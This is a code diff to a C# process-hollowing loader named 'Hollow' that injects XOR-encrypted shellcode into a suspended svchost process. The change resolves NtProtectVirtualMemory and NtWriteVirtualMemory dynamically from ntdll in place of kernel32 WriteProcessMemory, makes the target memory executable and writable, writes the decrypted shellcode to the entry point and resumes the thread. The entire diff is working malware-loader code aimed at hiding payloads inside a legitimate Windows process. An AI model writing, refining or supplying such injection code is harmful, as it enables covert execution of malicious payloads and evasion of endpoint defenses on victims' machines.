@@ -184,22 +184,46 @@ namespace Hollow
             // Now we get the actual address of entry point by adding the calculated RVA to the base address of our target process
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svcHostBase);
             Console.WriteLine($"[*] Found address of entry point [Entry Point: 0x{addressOfEntryPoint.ToString("x")}]");
-            
-            // Decryption Routine
-            for (int i = 0; i < shellcode.Length; i++)
+
+            var vpvmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
+            var ntProtectVirtualMemory = (Win32.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(vpvmAddress, typeof(Win32.NtProtectVirtualMemory));
+            Win32.MEMORY_PROTECTION oldProtect = (Win32.MEMORY_PROTECTION)0;
+            Win32.MEMORY_PROTECTION newProtect = Win32.MEMORY_PROTECTION.PAGE_EXECUTE_WRITECOPY;
+            IntPtr size = new IntPtr(entrypoint_rva + shellcode.Length );
+            var vpmCheck = ntProtectVirtualMemory(
+                hProcess,
+                ref svcHostBase,
+                ref  size,
+                newProtect,
+                ref oldProtect
+                );
+
+            if (vpmCheck != Win32.NTSTATUS.Success)
             {
-                shellcode[i] = (byte)(shellcode[i] ^ k[i % k.Length]);
+                Console.WriteLine($"[!] Failed to modify memory protections for writing. [Returned value: {vpmCheck}]");
+                return;
+            }
+            else
+            {
+                Console.WriteLine($"[*] Memory protections modified to {newProtect}. [Returned value: {vpmCheck}]");
             }
 
-            /**
             // Load NtWriteVirtualMemory into the program from ntdll
             var wpmAddress = Generic.GetLibraryAddress("ntdll.dll", "NtWriteVirtualMemory");
             var ntWriteVirtualMemory = (Win32.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(Win32.NtWriteVirtualMemory));
             uint nbRead = 0;
 
+
+            // Decryption Routine
+            for (int i = 0; i < shellcode.Length; i++)
+            {
+                shellcode[i] = (byte)(shellcode[i] ^ k[i % k.Length]);
+            };
+
             // https://stackoverflow.com/questions/537573/how-to-get-intptr-from-byte-in-c-sharp
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
+
 
             // Write shellcode into the process execution instructions
             var writeCheck = ntWriteVirtualMemory(
@@ -209,39 +233,19 @@ namespace Hollow
                 addressOfEntryPoint,
                 // Our shellcode, length, and (n) bytes written 
                 unmanagedPointer, 
-                (uint)shellcode.Length + 1, 
+                (uint)shellcode.Length, 
                 ref nbRead
             );
 
             if (writeCheck != Win32.NTSTATUS.Success)
             {
-                Console.Write($"[!] Failed to write to remote svchost process. [Error: {writeCheck}]");
+                Console.WriteLine($"[!] Failed writing memory with NtWriteVirtualMemory. [Returned value: {writeCheck}]");
                 return;
             }
-            Marshal.FreeHGlobal(unmanagedPointer);
-            **/
-
-            var wpmAddress = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
-            var writeVirtualMemory = (Win32.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(wpmAddress, typeof(Win32.WriteProcessMemory));
-            uint nbRead = 0;
-
-            // https://stackoverflow.com/questions/537573/how-to-get-intptr-from-byte-in-c-sharp
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
-            Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
-
-            // Write shellcode into the process execution instructions
-            var writeCheck = writeVirtualMemory(
-                // Handle to svchost
-                hProcess,
-                // Address of entry point into svchost
-                addressOfEntryPoint,
-                // Our shellcode, length, and (n) bytes written 
-                unmanagedPointer,
-                (uint)shellcode.Length,
-                ref nbRead
-            );
-
-            Marshal.FreeHGlobal(unmanagedPointer);
+            else
+            {
+                Console.WriteLine($"[*] Successfully wrote to {shellcode.Length} bytes to 0x{addressOfEntryPoint.ToString("x")} with NtWriteVirtualMemory. [Returned value: {writeCheck}]");
+            }
 
             //Since the thread is suspended, we resume rather than execute it
             var resThreadParameters = new object[]
@@ -260,6 +264,7 @@ namespace Hollow
             else
             {
                 Console.WriteLine($"[*] Resumed thread successfully. [Returned value: {resumeCheck}]");
+                Marshal.FreeHGlobal(unmanagedPointer);
             }         
         }
     }
